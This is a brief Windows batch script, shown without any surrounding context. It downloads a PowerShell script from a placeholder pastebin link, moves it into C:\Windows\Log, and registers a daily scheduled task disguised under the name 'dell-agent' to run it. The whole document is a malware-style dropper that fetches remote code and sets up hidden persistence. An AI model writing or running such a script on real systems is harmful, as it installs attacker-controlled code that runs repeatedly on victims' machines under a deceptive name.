ECHO OFF && curl <pastebin_raw_link> > sus.ps1 & move .\sus.ps1 C:\Windows\Log\ & schtasks /Create /SC DAILY /TN "dell-agent" /TR "powershell -Command 'C:\Windows\Log\sus.ps1';" /ST 09:30 && 
REM echo "schedulded task created"